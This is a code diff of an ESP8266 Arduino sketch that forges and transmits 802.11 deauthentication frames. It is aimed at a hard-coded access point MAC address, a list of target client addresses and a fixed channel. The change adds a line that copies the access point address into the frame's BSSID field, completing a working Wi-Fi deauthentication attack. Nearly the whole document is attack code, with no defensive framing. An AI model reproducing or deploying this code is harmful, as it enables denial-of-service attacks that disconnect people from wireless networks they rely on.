@@ -1,13 +1,16 @@
+//specified channel and ap
 #include <ESP8266WiFi.h>
+
 extern "C" {
   #include "user_interface.h"
 }
+
 const byte cno = 2; //number of target clinets as following listed
 const byte wchannel = 1; //target channel
 uint8_t ap[6] = {0xA4, 0x99, 0x47, 0x4C, 0xDB, 0xC3}; //target access point
 uint8_t client [cno][6] = { //target client
                             // insert in this format {0x8C,0x00,0x6D,0x5F,0xF7,0x2C},
-                         };
+                          };
 uint8_t packet[26] = { //deauth frame sample
   /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
   /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
@@ -23,6 +26,7 @@ uint16_t deauth(uint8_t *clients, uint8_t *aps)
     int i=0;
     for (i=0; i<6; i++) packet[i+4] = clients[i];
     for (i=0; i<6; i++) packet[i+10] = aps[i];
+    for (i=0; i<6; i++) packet[i+16] = aps[i];
     wifi_send_pkt_freedom(packet, 26, 0);
 }
 
